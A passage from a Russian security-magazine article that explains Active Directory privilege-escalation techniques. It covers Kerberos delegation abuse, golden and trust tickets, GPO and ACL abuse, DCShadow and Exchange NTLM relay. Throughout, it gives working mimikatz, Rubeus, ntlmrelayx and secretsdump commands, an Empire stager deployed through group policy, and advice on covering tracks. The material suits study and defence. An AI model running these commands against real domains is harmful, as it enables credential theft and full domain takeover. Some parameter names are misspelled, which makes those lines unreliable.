                  Пример PowerShell‐кода в DLL

После успешного выполнения скрип та мы будем прос лушивать на своем хос‐
те обратное подключение:


PS C:\> powercat ‐l ‐v ‐p 443 ‐t 1000





                 Пример успешного бэкконнекта

В результате мы получим права system на DC.


ДЕЛЕГИРОВАНИЕ KERBEROS
Делегирование — это функция Active Directory, поз воляющая учетке поль‐
зователя или компьютера выдавать себя за другую учетную запись. В качес‐
тве примера разберем ситуацию, когда пользователь обращается к веб‐при‐
ложению, чтобы работать с ресурсами на сервере базы данных.





        Схема взаимо действия с базой данных через веб‐сервер

Исходя из этой схемы, веб‐сервер должен работать с сервером базы данных
от имени пользователя. Здесь и помогает делегирование — к учетным
записям пользователей в среде Windows применяется флаг TRUSTED_TO_AU‐
THENTICATE_FOR_DELEGATION (T2A4D) User‐Account‐Control.


             INFO

                       Атрибут  User‐Account‐Control  (который
                      не следует путать с механизмом контроля учет‐
                      ных записей Windows) устанавливает определен‐
                     ные атрибуты для учетных записей Active Directo‐
                             ry — например, если учетная запись отключена,
                       заблокирована или пароль пользователя никогда
                      не истекает.


Для реализации делегирования Microsoft внедрила расширение протокола
Kerberos «Служба для дос тупа пользователя к себе» (S4U2Self). Это рас‐
ширение позволяет службе зап рашивать токен для другого пользователя,
предоставляя имя пользователя, но не вводя пароль. Когда учетная запись
пользователя имеет флаг T24AD, такие токены могут быть запрошены с атри‐
бутом forwardable, который дает службе возможность аутентифицироваться
с этими токенами для других служб.
   Чтобы избежать неограниченного делегирования, Microsoft гарантирова‐
ла, что данные токены могут использоваться толь ко для определенных служб,
которые настро ены для учетной записи поль зователя через расширение
«Служба для пользователя через прокси» (S4U2proxy). Этот параметр кон‐
тролируется атрибутом msDS‐AllowedToDelegateTo в учетной записи поль‐
зователя. Он содержит список имен участников службы, который указывает,
на какие службы Kerberos пользователь может перенаправлять эти токены
(так же, как выпол няется обычное огра ниченное делеги рование в Kerberos).
Например, ты хочешь, чтобы твоя веб‐служба имела доступ к общей папке
для пользовате лей. Тогда учет ная запись службы должна иметь атрибут


ms‐DS‐AllowedToDelegateTo "SIFS/fs.dom.com"

Для наглядности рассмот рим схему аутентификации Kerberos.





                  Схема аутентификации Kerberos

 1. Пользователь  аутентифицируется  в  веб‐сервисе  с  использованием
   не Kerberos‐совместимого механизма аутентифика ции.
 2. Веб‐служба запрашивает билет для учет ной записи user без указания
   пароля, как для учетной записи svc_web.
 3. KDC проверяет значение svc_web  userAccountControl для флага
  TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION , а также не заблокиро‐
   ван ли целевой поль зователь для делегирова ния. Если все в поряд ке, KDC
   возвращает перенаправля емый билет для учетной записи пользователя
    (S4U2Self).
 4. Затем служба передает этот билет обратно в KDC и запрашивает билет
   для службы cifs/fs.contoso.com.
 5. KDC проверяет поле msDSAllowedToDelegateTo в учетной записи
  svc_web. Если служба указана в списке, она вер нет билет службы
   для общей папки (S4U2proxy).
 6. Веб‐служба теперь может проходить проверку подлинности на общем
   ресурсе в качестве учетной записи пользователя с использовани ем пре‐
   доставленного билета.


Не ограничен ное делегирование
При неограниченном делегирова нии Kerberos на сервере, на котором раз‐
мещена служба, контроллер домена DC помещает копию TGT (ticket granting
ticket — билет для получения билета) пользователя в TGS (Ticket Granting
Server — сервер выдачи билетов или разрешений) службы. Когда данные
пользователя предоставляются серверу для дос тупа к службе, сервер откры‐
вает TGS и помещает TGT пользователя в LSASS (Local Security Authority Sub‐
system Service — сервис проверки подлинности локальной системы безопас‐
ности) для дальнейше го использования. Сервер приложе ний теперь может
выдавать себя за этого пользователя без ограничений!
   Таким образом, хост, на котором активно неограниченное делегирование,
будет содержать  в  памяти TGT  делегированного  пользователя. Наша
задача — его достать, чтобы скомпромети ровать пользователя. Данный вид
атаки возможен, если мы скомпрометировали сам хост либо пользователя,
имеющего право управлять хос том с делегирова нием.
  Обнаружить все компь ютеры с неог раниченным делеги рованием Kerberos
очень просто: у них будет выставлен флаг TrustedForDelegation. Это опре‐
деляется с помощью инс трумента ADModule, а конкретнее — следующей
команды:


PS C:\> Get‐ADComputer ‐Filter {TrustedForDelegation ‐eq $True}

Того же результата можно достигнуть, выполнив такую команду PowerView:


PS C:\> Get‐DomainComputer–Unconstrained

Теперь нужно отослать запрос MS‐RPRN RpcRemoteFindFirstPrinter‐
ChangeNotification (аутентификация Kerberos) на сервер печати DC (служ‐
ба Spooler). DC немедленно отпра вит ответ, который включает TGS (полную
копию TGT) учетной записи компь ютера контроллера домена, так как на
нашем хосте исполь зуется неограниченное делеги рование.
   Чтобы это сделать, сначала пос тавим прос лушивание входящих соеди‐
нений с помощью Rubeus :


C:\> Rubeus.exe monitor /interval:1

Теперь инициируем запрос с помощью SpoolSample:


C:\>. \SpoolSample.exe DC.domain.dom yourhost.domain.dom

В Rubeus мы увидим подключение.





                     Подключение Rubeus

Теперь получим TGT:


C:\> Rubeus.exe ptt /ticket:doIE+DCCBPSgAwIBBaE ...
C:\> Rubeus.exe klist

Имея TGT, мы можем выполнить DCSync‐ата ку с помощью mimikatz:


# lsadump::dcsync /user:HACKER\krbtgt





                         DCSync krbtgt

Мы добыли NTLM‐хеш учетной записи krbtgt и теперь можем сделать golden
ticket, с которым получим полный дос туп ко всей инфраструктуре домена:


# kerberos::golden /user:Administrator /domain:domain.dom /sid:
S‐1‐5‐21‐1559558046‐1467622633‐168486225 /krbtgt:9974f218204d6b8
109ea99ae9c209f23 /ptt

Теперь можно удаленно подключиться к контроллеру домена с учетной
записью администратора:


PS C:\> Enter‐PSSession ‐ComputerName dc




                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
              АТАКИ
 НА ACTIVE DIRECTORY
                 РАЗБИРАЕМ АКТУАЛЬНЫЕ МЕТОДЫ
                    ПОВЫШЕНИЯ ПРИВИЛЕГИЙ





Ограничен ное делегирование
Не вдаваясь в подробности реализации S4U2Self/S4U2proxy, можно сказать,
что любые учетные записи с SPN (Service Principal Name), имеющие в свой‐
ствах установленный атрибут msDS‐AllowedToDelegateTo, могут выдавать
себя за любого пользователя в домене.
   Если бы можно было изменить содержимое msDS‐AllowedToDelegateTo
для произвольной учетной записи, мы могли бы выполнить DCSync‐атаку
на текущий домен. Но для изменения любых параметров делегирования
на контроллере домена нуж но иметь привилегию SeEnableDelegationPriv‐
ilege. По умолчанию такими правами обла дают только учетные записи адми‐
нистраторов домена.
  Первое расширение, которое реализует огра ниченное делегирование, —
S4U2self. Оно позволяет службе запрашивать у себя специальный перенап‐
равляемый TGS от имени конкретного пользователя. Такой механизм пред‐
назначен  для  случаев,  когда  пользователь  авторизуется  в  сервисе
без использования Kerberos (в нашем примере — с веб‐сервисом).
  Во время первого запроса TGS будет установлен флаг переадре сации,
чтобы возвращаемый TGS был помечен как пересылаемый и мог исполь‐
зоваться с расширением S4U2proxy. При неограниченном делегировании
для идентификации поль зователя применяется TGT, в этом слу чае рас‐
ширение S4U использует структуру PA‐FOR‐USER в качестве нового типа
в поле данных [padata]/pre‐authentication.
   S4U2self может выпол няться для любой пользовательской учетной записи,
при этом пароль целево го пользователя не требуется. Кроме того, S4U2self
разрешается, только если учетка запрашивающего пользователя имеет флаг
TRUSTED_TO_AUTH_FOR_DELEGATION.
  Существует вид атак под названием Kerberoasting — они предназначены
для извлечения служебных учетных записей из Active Directory от имени обыч‐
ного пользователя без отсылки пакетов в целевую систему. Почему в рас‐
сматриваемом нами случае не получится извлечь с использовани ем Ker‐
beroasting данные любого пользователя, которого мы захотим? Потому что
сертификат Privilege Account Certiﬁcate (PAC) подписан для исходного (а
не целевого) пользователя (в данном случае для запрашивающей учетной
записи службы). Но зато теперь у нас есть специальный билет службы,
который можно переадресовать целевой службе, настроенной для огра‐
ниченного делегирования.
   Второе расширение, использующее огра ниченное делегирование, —
S4U2proxy. Оно позволяет вызывающей сто роне (в нашем случае учетной
записи службы) использовать этот перенаправляемый билет, чтобы зап‐
росить TGS к любому SPN, перечисленно му в msDS‐AllowedToDelegateTo,
для олицетворения указанного на этапе S4U2self пользователя. KDC про‐
веряет, есть ли запрашиваемый сервис в поле msDS‐AllowedToDelegateTo
запрашивающего пользователя, и выда ет билет, если эта проверка прошла
успешно.
   Таким образом, мы можем определить кри терий поиска ограниченного
делегирования — ненулевое значение msDS‐AllowedToDelegateTo:


PS C:\> Get‐DomainComputer ‐TrastedToAuth
PS C:\> Get‐DomainUser ‐TrastedToAuth

Учетная запись компьютера или пользователя с SPN, указанным в msDS‐Al‐
lowedToDelegateTo, может олицет ворять любого пользователя в целевой
службе. Поэтому, скомпрометировав одну из этих учетных записей, ты
можешь захватить привилегии доступа к целевому SPN.


             INFO

                     Для MSSQLSvc это позволило бы получить права
                     администратора баз дан ных. CIFS откроет пол‐
                     ный удаленный доступ  к файлам. HTTP  поз‐
                       волил  бы  захватить  удаленный  веб‐сервис.
                    LDAP — произвести DCSync. HTTP/SQL, даже
                       если они не имеют повышенных прав админис‐
                        тратора в целевой системе, также могут быть
                       использованы для повышения прав до System.


С использованием описанного принципа можно провести четыре атаки
на повышение привиле гий в системе.
   Рассмотрим пер вый вариант. Если тебе известен пароль от учетной
записи, для которой включено ограниченное делегирование, ты можешь
использовать Kekeo для зап роса TGT, выполнить запрос S4U TGS и затем
получить доступ к целевой службе.
  Выполняем запрос TGT для учетной записи поль зователя с включенным
ограниченным делегирова нием (к примеру, SQLService):


C:\> asktgt.exe /user:Пользователь /domain:домен /password:пароль /
ticket:sqlservice.kirbi

Теперь выполняем S4U2proxy c полученным TGT. В результате у нас будет TGS
для доступа к приватному ресурсу в домене:


C:\> s4u.exe /tgt:sqlservice.kirbi /user:Administrator@домен /
service:cifs/ресурс_в_домене

Используем mimikatz, чтобы применить TGS:


# kerberos::ptt файл_с_полученным_TGS

В итоге мы получаем дос туп к приватному ресурсу.
   Если ты можешь скомпрометировать учет ную запись компьюте ра, которая
настроена для ограниченного делегирова ния, подход к атаке будет несколько
другим. Поскольку любой процесс, выполняющийся с системны ми привиле‐
гиями, получает привилегии учетной записи локального компьюте ра, мы
можем пропустить шаг с asktgt.exe. Ты также можешь использовать альтер‐
нативный метод для выполнения процесса S4U2proxy, предоставленный Mi‐
crosoft. Для этого откроем PowerShell и выполним следующий код:


PS C:\> $Null = [Reflection.Assembly]::LoadWithPartialName('System.
IdentityModel')
PS C:\> $Ident = New‐Object System.Security.Principal.Window
sIdentity @('Administrator@domain.dom')
PS C:\> $Context = $Ident.Impersonate()

Теперь, когда мы применили TGS ука занного пользователя, мы можем снова
работать с приватным ресурсом. Затем вернемся в свое пользовательское
пространство следующей командой PowerShell:


PS C:\> $Context.Undo()

В третьем случае выполняются все те же дей ствия, что и в первом, только
вместо пароля используется NTLM‐хеш пользователя. Четвертая атака ана‐
логична третьему варианту, только вмес то имени пользователя берется имя
компьютера.


Ограничен ное делегирование на осно ве ресурсов
Эта разновидность огра ниченного делегирова ния очень похожа на обычное
ограниченное делегирование, но работает в про тиво положном направлении.
 1. Ограниченное делегирование из учетной записи A в учетную запись B нас‐
   траивается для учетной записи A в атрибуте msDSAllowedToDelegate
  To и определяет «исходящее» доверие от A до B.
 2. Ограниченное  делегирова ние  на  основе  ресурсов  настраивается
   для  учетной записи B в атрибуте msDSAllowedToActOnBehalfO
  fOtherIdentity и определяет «входящее» доверие от A до B.

Чтобы повысить привилегии во втором случае, нужно указать в атрибуте
msDS‐AllowedToActOnBehalfOfOtherIdentity учетную запись контролиру‐
емого нами компьютера. Метод сра бота ет, если мы знаем набор имен SPN
для объекта, к которому хотим получить доступ. Дело в том, что с параметром
MachineAccountQuota (по умолчанию он позволяет каждому пользователю
создавать десять учетных записей компь юте ров) это легко сделать из‐под
непривилегированной учетной записи. Единс твенная привилегия, которая
нам понадобится, — это воз можность записать атрибут на целевой компь‐
ютер.
  Создаем учетную запись, к которой мы будем иметь полный доступ,
с помощью PowerMad и указываем пароль компьюте ра, чтобы у нас был хеш
для него.


PS C:\> $password = ConvertTo‐SecureString 'PASSWORD' ‐AsPlainText
‐Force
PS C:\> New‐MachineAccount ‐machineaccount RBCDmachine ‐Password $(
$password)

Теперь нужно запол нить атрибут msDS‐AllowedToActOnBehalfOfOtherIden‐
tity для целевого DC, на который у нас имеются разрешения:


PS C:\> Set‐ADComputer $targetComputer ‐PrincipalsAllowedToDeleg
ateToAccount RBCDmachine$
PS C:\> Get‐ADComputer $targetComputer ‐Properties PrincipalsAllow
edToDelegateToAccount

На следующем этапе нужно получить хеш нашего пароля:


PS C:\> ConvertTo‐NTHash $password

Теперь, когда у нас есть все необходимое для ата ки, получим билет:


C:\> s4u.exe /user:RBCDmachine$ /rc4:хеш /impersonateuser:
пользователь /msdsspn:cifs/ресурс /ptt

Мы получим тикет, проверить который мож но так:


# klist

Таким образом нам открывается доступ к ресурсу на контроллере домена.
Этим же способом мож но выполнить DCSync через LDAP.


НЕБЕЗОПАСНЫЕ ПРАВА ДОСТУПА К ОБЪЕКТУ ГРУППОВОЙ
ПОЛИТИКИ
Объекты групповой политики — это контейнеры Active Directory, исполь‐
зуемые для хранения объединенных в группы параметров политики. Эти объ‐
екты  затем  связываются  с  конкретными  сайтами,  доменами  или  с
какими‐либо организационными единица ми (Organizational Unit — OU). Объ‐
екты групповой политики представляют собой очень сложные структуры, сос‐
тоящие из связей, наследований, исключений, филь тров и групп. При кон‐
фигурации доменов в этом болоте час то допус кают ошибки, которые нево‐
оруженным взглядом и не видны. Найти эти ошиб ки и показать путь компро‐
метации объекта групповой политики поможет инс трументарий BloodHound.
  Предположим, что в объектах групповой политики име ется скомпромети‐
рованный эле мент. Групповая политика имеет огромное количество парамет‐
ров, которыми можно манипулировать. Это дает несколько способов ском‐
прометировать машины и пользователей, име ющих отношение к уязвимому
объекту.
  Например, можно выполнить определен ные сценарии, настроить бэкдор
в Internet Explorer, выдать MSI‐файл в разделе «Установка программного
обеспечения», добавить свою учетную запись домена в группу локальных
администраторов или RDP либо принудительно смонтировать  сетевой
ресурс (который находится под нашим контролем, что дает воз можность зав‐
ладеть учетными данными подключившихся поль зователей).
  Для реализации задуманного можно запус тить запланированную задачу,
которая удаляется сама при каждом обновлении групповой политики. Эта
часть атаки доволь но прос та — нам нужно соз дать шаблон .xml в виде
schtask, а затем скопировать его в файл <GPO_PATH>\Machine\Preferences\
ScheduledTasks\ScheduledTasks.xml объекта групповой политики, который
мы можем редактировать. Подождав час‐два до завершения цикла обновле‐
ния групповой политики, мы удалим файл .xml, чтобы замести следы.
  Модуль PowerView New‐GPOImmediateTask может сделать это автомати‐
чески.    Чтобы    вос пользоваться    им,    потребуется    аргумент
‐TaskName, ‐Command, который задаст команду для запуска  (по умол‐
чанию — powershell.exe), а параметр ‐CommandArguments указывает аргу‐
менты для данного исполняемо го файла. Описание задачи, ее автора и дату
модификации так же можно изменить с помощью соответству ющих парамет‐
ров. Файл Schtask.xml создается в соответствии с вашими спе цификациями
и копируется в местоположение, определяемое аргу ментами ‐GPOname или
‐GPODisplayname.  По  умолчанию  функция  спрашивает  раз решения
перед копированием, но эту опцию можно отклю чить с использованием аргу‐
мента ‐Force.
  Давай используем New‐GPOImmediateTask, чтобы загрузить Stager Empire
на машины, где применя ется объект групповой политики {3EE4BE4E‐7397‐
4433‐A9F1‐3A5AE2F56EA2} (отоб ражаемое имя SecurePolicy):


New‐GPOImmediateTask ‐TaskName Debugging ‐GPODisplayName Secure
Policy ‐CommandArguments '‐NoP ‐NonI ‐W Hidden ‐Enc JABXAGMAPQBO...'
‐Force





                  Empire stager в New‐GPOImmediateTask

Полученный результат демонс трирует, насколько опасны ошибки в групповых
политиках домена.


НЕБЕЗОПАСНЫЕ ПРАВА ДОСТУПА ACL
ACL (списки контроля доступа) — это набор пра вил, которые определя ют,
какие объекты имеют разрешения для иного объекта в среде Active Directory.
Такими объектами могут быть учетные записи поль зователей, группы, учет‐
ные записи компьюте ров, сам домен и мно гое другое.
  ACL может быть настро ен для отдельного объекта, такого как учетная
запись пользователя, но также его мож но нас троить и для OU. Основное пре‐
имущество настрой ки ACL в OU состоит в том, что при правильной настрой ке
все объекты‐потомки будут наследовать ACL. ACL OU, в котором находятся
объекты, содержит элемент управления дос тупом (Access Control Entry, ACE).
Он определяет идентификатор и соот ветс твующие раз решения, применя‐
ющиеся к OU или нисходящим объектам. Каждый ACE включает в себя SID
и маску доступа, причем ACE могут быть четырех типов: «доступ разрешен»,
«доступ отклонен», «разрешенный объект» и «запрещенный объект». Разница
между типами «доступ раз решен» и «раз решенный объект» состоит только
в том, что последний тип используется исключительно в Active Directory.
   Рассмотрим пример атаки, использующей неправильную настройку ACL.
Предположим, мы уже собрали исходную информацию с помощью Blood‐
Hound, поэтому сразу перейдем к ста дии повышения привиле гий.
   BloodHound строит граф, где целевой группой выступает группа «Адми‐
нистраторы домена».





                    Граф, построенный BloodHound

Слева находится пользователь с относительно низкими привиле гиями и путь
атаки только для ACL, который в ито ге контро лирует группу администраторов
домена. Этот пользователь — член группы безопас ности (MemberOf) в цен‐
тре. Эта группа име ет полный контроль  (GenericAll) над пользователем
справа. Так как ACL наследу ется, то пользователь сле ва тоже име ет такой
контроль.





             Первый этап продвижения к целевой группе

GenericAll означает полный кон троль над объектом, включая возможность
добавлять других участников в группу, изменять пароль пользователя, не зная
текущего, регистрировать SPN. Эксплуатируется эта возможность с помощью
Set‐DomainUserPassword или Add‐DomainGroupMember.
  Идем дальше. Поль зователь слева принадлежит группе в середине. Эта
группа   име ет   как   полный     (GenericAll),   так   и   избы точный
(ForceChangePassword) контроль над пользователем слева.





              Второй этап продвижения к целевой группе

ForceChangePassword  подразумевает  возможность  изменить  пароль
целевого пользователя, не зная текущего. Эксплу атируется с помощью
Set‐DomainUserPassword.
  Завершающий     этап.    Группа    слева    име ет    привилегию
ForceChangePassword в отношении нес кольких пользовате лей, которые при‐
надлежат к группе в центре. Эта группа в центре обла дает пол ным контролем
над группой справа («Администраторы домена»).





          Завершающий этап продвижения к целевой группе

Важное замечание: кон троль над группой «Адми нистраторы домена» может
означать, что мы получили контроль над поль зователями в этой группе.
В таком случае мы создадим своего пользователя и добавим его в данную
группу. После этого мы можем выполнить DCSync‐ата ку и, чтобы скрыть свои
следы, удалить созданно го пользователя.
   Вот так мы используем BloodHound и ошиб ки конфигурации ACL, чтобы
получить контроль над доменом.
  Не могу не упомянуть об автоматизированном варианте этой атаки,
с  использованием  скрипта  Invoke‐ACLPwn.  Инстру мент  экспортиру ет
с помощью SharpHound все списки ACL в домене, а также членство в группе
учетной записи пользователя, под которой он запус кается.





                Парамет ры запуска Invoke‐ACLPwn

Когда цепочка будет рассчитана, скрипт начнет пос ледовательно выпол нять
каждый шаг в цепочке. При желании вызывается функция mimikatz DCSync
и запрашивается хеш учетной записи пользователя. По умолчанию будет
использоваться учетная запись krbtgt. Пос ле завершения эксплуатации сце‐
нарий удалит членство в груп пах, которые были добавлены во вре мя эксплу‐
атации, а также записи ACE в ACL объекта домена.
  Результат тестирования компанией Fox‐It представлен ниже.





                  Результат работы Invoke‐ACLPwn

Скрипт перечислил и про шел 26 групп, изменяя членство в группах безопас‐
ности и управления. В итоге был получен хеш учетной записи krbtgt.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
              АТАКИ
 НА ACTIVE DIRECTORY
                 РАЗБИРАЕМ АКТУАЛЬНЫЕ МЕТОДЫ
                    ПОВЫШЕНИЯ ПРИВИЛЕГИЙ





ДОМЕННЫЕ ТРАСТЫ
Часто в организации используется нес колько доменов с настроенными меж‐
ду ними доверительными  отношениями —  трас тами. Это необходимо
для того, чтобы пользователь из одного домена мог получить доступ к сер‐
вису в другом домене.
  Доверительные отно шения между доменами могут быть односторонними
и двусторонними. То есть если домен А доверя ет домену Б, то домен Б может
оперировать ресурсами домена А. Также работает понятие транзитивности:
если домен А доверяет домену Б, а домен Б доверяет домену В, то домен
А тоже доверяет домену В.
  Иерархическая система доменов, имеющая  корневой  домен,  будет
называться деревом доменов. При этом, если разные деревья находятся
в разных формах доверитель ных отно шений, совокупность этих деревьев
будет называться лесом.
  При аутентификации Kerberos меж ду доменами, состоящими в довери‐
тельных отношениях, контроллер домена пользователя шифрует TGS не клю‐
чом службы, а общим ключом. Пользователь передает этот TGS контроллеру
домена службы, а тот вернет ему TGS, зашифрованный ключом службы. Толь‐
ко теперь пользователь может обра титься к тому ресурсу, к которому хотел.





      Схема аутентификации Kerberos между доверенными доменами

NTLM‐аутентификация в данном случае отличается тем, что контроллер
домена службы, проверив разрешения для аутентификации, передает запрос
на контроллер домена клиента. Именно он проводит проверку и воз вращает
результат.





       Схема аутентификации NTLM меж ду доверенными доменами

Схему аутентификации в доверенных доменах мы разобрали, как скомпро‐
метировать DC в домене — тоже. Теперь раз беремся, как скомпромети‐
ровать другой доверенный домен.
  Пароль доверия можно отыскать в хра нилище учетных данных домена.
Для этого нужно найти имя со знаком дол лара на конце. Большинство учетных
записей  с подобными именами —  это  учетные записи компьютеров,
но некоторые будут трастовыми.




               NTLM‐хеш доверенной учетной записи

Ключ доверия был извлечен вместе со всеми пользовательскими данными
при компрометации учетных данных Active Directory. Каждое доверие вклю‐
чает связанную учетную запись пользователя, которая содержит этот хеш
пароля NTLM. Указанные данные могут быть использованы для под делки
доверительных TGS.
  Доверенный билет соз дается так же, как «золотой билет». Для этого
используется та же команда mimikatz, но с раз ными параметрами. Ключ служ‐
бы — это хеш пароля доверенного NTLM, а целью будет полное доменное
имя целевого домена.


# kerberos::golden /domain:текущий_домен /sid:SID_домена /rc4:
NTLM_хеш /user:Administrator /service:krbtgt /target:целевой_домен /
ticket:путь_для_сохранения_билета

Теперь получим TGS для целевой службы в целевом домене, используя
Kekeo.


C:\> asktgs.exe сохраненный_билет cifs/полное_имя_целевой_службы

О том, как применять полученный тикет, я рас сказывал выше. Теперь рас‐
смотрим, как подделать TGS внут ри леса. Первым делом извле каем все трас‐
товые доверительные ключи:


# Privilage::debug
# Lsadump::trust /patch

И создаем поддельный доверительный TGT:


# kerberos::golden /domain:текущий_домен /sid:SID_домена /sids:
SID_целевого домена /rc4:NTLM_хеш /user:Пользователь /service:krbtgt
/target:целевой_домен /ticket:путь_для_сохранения_билета

Затем получаем TGS:


C:\> asktgs.exe сохраненный_билет cifs/
полное_имя_целевого_контроллера_домена

И внедряем TGS, чтобы получить дос туп с поддель ными правами:


C:\> kirbikator lsa путь_к_TGS

После успешного выполнения команды пользователь станет админис тра‐
тором и получит повышенные права в целевом домене. Так мы можем прод‐
вигаться от домена к домену, поскольку каждый домен имеет свя занный
с другим доменом пароль.


DCSHADOW
Одна из задач злоумышленников — получать учетные данные пользователей
и компьюте ров, оставаясь незамеченным для средств обнаружения. С этой
целью было разработано несколько методов атак: внедрение LSASS, зло‐
употребление теневым копированием, ана лиз тома NTFS, управление чувс‐
твительными атрибутами и другие.
  Среди всех этих атак одна связана с атакой DCShadow. Атака DCSync
основана на том, что члены групп «Администра торы домена» или «Контрол‐
леры домена» могут запрашивать репликацию данных у DC. Фактически (как
описано в спецификации MS‐DRSR для репликации контроллера домена) эти
группы могут запрашивать у контроллера домена репликацию объ ектов AD
(включая учетные данные пользователя) через RPC GetNCChanges. DCSync‐
атака с использованием mimikatz выглядит следующим образом:


# lsadump::dcsync /user:Administrator





               DCSync‐ата ка с исполь зованием mimikatz

Одно из основных огра ничений ата ки DCSync — злоумышленник не сможет
внедрить новые объекты в целевой домен. Он может стать владельцем адми‐
нистративной учетной записи, используя Pass‐The‐Hash, и впоследс твии вво‐
дить новые объекты. Но для этого требуется боль ше уси лий, больше шагов,
что повышает вероятность обнаружения. Ата ка DCShadow снимает это огра‐
ничение. С помощью DCShadow зло умышленники больше не пытаются реп‐
лицировать дан ные, а регистрируют новые контроллеры домена в целевой
инфраструктуре для внедрения объектов  Active Directory или изме нения
существующих.
  Сервер можно назвать контроллером домена, если он пред лагает четыре
клю чевых компонента:
 • базу данных, которая должна быть дос тупна через протоколы LDAP
   и реализовывать несколь ко RPC в соответствии со спецификациями MS‐
  DRSR и MS‐ADTS, то есть поз волять репликацию данных;
 • сервис аутентификации, доступный через протоколы Kerberos, NTLM, Netl‐
   ogon или WDigest;
 • систему  управления  конфигура цией,  использующую протоколы SMB
   и LDAP;
 • сервис DNS, используемый клиента ми для поиска ресурсов и поддержки
   аутентификации.

Помимо всего этого, новый DC должен быть зарегистрирован сервисом KCC
(средство проверки согласованности знаний). KCC — это встроенный про‐
цесс, который выполняет ся на всех контроллерах домена и создает тополо‐
гию репликации для леса Active Directory. KCC соз дает отдельные топологии
репликации. Этот сервис также динамичес ки корректирует топологию, чтобы
она соответствовала добавлению новых контроллеров домена и удалению
существующих контрол леров домена. По умолчанию KCC запускает реп‐
ликацию каждые 15 минут.
  Обеспечить все это можно при выполнении следующих условий: атака
должна быть выпол нена с компьютера в домене, у атакующего имеется при‐
вилегия System на компь ютере и при вилегия администратора домена
в самом домене.
  Первым делом с помощью mimikatz повышаем свои привилегии до System.





          Получение привилегии System с помощью mimikatz

Теперь мы должны изменить зна чение userAccountControl:


lsadump::dcshadow /object:pc‐10$ /atribute:userAccountControl /value:
532480

Передаем соответствующий атрибут:


lsadump :: dcshadow /push

После выполнения команды увидим, как значения обновля ются, а RPC‐сер‐
вер останавливается.





                 Успешный результат атаки DCShadow

Можно  считать,  что мы  зарегистрирова ли новый  контроллер  домена,
с которым можно производить дальнейшие операции.


EXCHANGE
Основная уязвимость в инфраструктуре это го прог раммного продукта такова.
Exchange обладает высокими привилегиями в домене Active Directory. Группа
Exchange Windows Permissions имеет дос туп WriteDacl в Active Directory, что
позволяет любому члену этой груп пы изменять при вилегии домена, сре ди
которых есть привиле гия для реализации атаки DCSync.
   Чтобы выполнить произвольный код на хос тах в сети, можно использовать
особенности передачи аутентифика ции NTLM через SMB. Но другие протоко‐
лы также уяз вимы для рет рансляции. Наиболее интересен для этого протокол
LDAP, который можно использовать для  чтения и изменения объ ектов
в каталоге. Дело в том, что при подключении сервера с Windows к компьютеру
злоумышленника существует воз можность передать автоматическую провер‐
ку подлинности пользователя в системе другим машинам в сети, как показано
на рисунке. Такой прием называют relay‐ата кой.





                        Схема relay‐атаки

Когда аутентификация передается в LDAP, объекты в каталоге могут быть
изменены. В результате этим объектам предоставляются привилегии зло‐
умышленника, вклю чая привилегии, необходимые для операций DCSync.
Таким образом, мы дол жны зас тавить сервер Exchange проходить аутен‐
тификацию с помощью NTLM. Для этого необходимо зас тавить Exchange
аутентифицировать нашу систему.
  Можно заставить Exchange аутентифицировать ся по произвольному URL‐
адресу через HTTP с помощью функции Exchange PushSubscription. Служ‐
ба push‐уведомлений имеет воз можность отправлять сообщения каждые X
минут (где X может быть ука зан зло умышленником), даже если событие
не произошло. Это гарантирует, что Exchange подключится к нам, даже если
в папке  входящих сооб щений  нет  активнос ти. Схема  атаки  показана
на иллюстрации ниже.





        Схема DCSync‐ата ки с использовани ем push‐уведомлений

Инструменты для выполнения такой атаки вхо дят в состав пакета impacket.
  Сначала для ретрансляции LDAP запус тим ntlmrelayx, укажем подкон‐
трольного нам поль зователя и контроллер домена.


ntlmrelayx.py ‐t ldap://DC.domain.dom ‐‐escalate‐user USER

Теперь используем privexchange:


privexchange ‐ah Attacker_host Exchange_host ‐u USER ‐d DOMEN

Тут есть одно важное  но: пользователь должен иметь почтовый ящик
на нашем Exchange‐сервере. Через некоторое время (когда будет отправ‐
лено push‐уведомление) в ntlmrelayx можно наб людать следующий вывод.





                      Ус пешный relay в ntlmrelayx

Это означает, что у нашего пользователя есть привилегии для DCSync:


secretsdump domain/user@DC ‐just‐dc





           Успешная репликация учетных данных в secretsdump

Таким образом Exchange поз воляет нам получить репликацию учетных дан‐
ных.


SYSADMIN SQL SERVER
Рассмотрим  последовательность  действий,  которую можно  применить
для использования учетной записи службы SQL Server, чтобы повысить при‐
вилегии от локального администра тора до системного админис тратора DBA.
  SQL Server — это еще одно приложение Windows. В случае SQL Server
каждый экземпляр сервера устанавлива ется как набор служб Windows,
которые работают в фоновом режиме. Каждая из этих служб нас троена
для работы с учетной записью Windows. Связанная учетная запись затем
используется для глобального взаимодействия с операционной системой.
  Основная служба Windows SQL Server — служ ба SQL Server, которая
реализована в виде приложения sqlservr.exe.
  Службы SQL Server могут быть нас троены со многими типами учетных
записей Windows. Вот их список:
 • локальный пользователь;
 • LocalSystem;
 • NetworkService;
 • локальная управляемая учетная запись службы;
 • учетная запись управля емого домена;
 • пользователь домена;
 • администратор домена.

Компрометация службы SQL Server может привести к компрометации всего
домена. Но, независимо от привилегий учетной записи службы SQL Server
в операционной системе, в SQL Server она имеет привилегии sysadmin
по умолчанию.
  Для получения учетной записи служ бы мы будем использовать PowerUp‐
SQL. Для этого нам нужно иметь учет ную запись локального адми нистратора.
  Сначала найдем локальный SQL Server. В этом нам поможет команда Get‐
SQLInstanceLocal. В выводе команды нас интересу ет строка, содержащая
значение Instance: MSSQLSRV04\BOSCHSQL.
  Следующей командой получим учетную запись SQL Server:


Invoke‐SQLImpersonateService ‐Verbose ‐Instance MSSQLSRV04\BOSCHSQL

Нужно убе диться, что все прошло успешно:


Get‐SQLServerInfo ‐Verbose ‐Instance MSSQLSRV04\BOSCHSQL

В представленном выводе будет присутс твовать строка CurrentLogin: NT
Service\MSSQL$BOSCHSQL.
  В итоге мы получаем привилегию sysAdmin DBO. Также есть решение,
которое запустит cmd.exe в контексте каждой учетной записи службы SQL,
связанной с экземпляром MSSQLSRV04\BOSCHSQL:


Invoke‐SQLImpersonateServiceCmd ‐Instance MSSQLSRV04 \ BOSCHSQL





             Тер миналы с учетными записями службы SQL


ЗАКЛЮЧЕНИЕ
Напоследок хотелось бы отметить, что эта статья задумана не в качес тве
руководства к действию. Она лишь показы вает, насколько компетентными
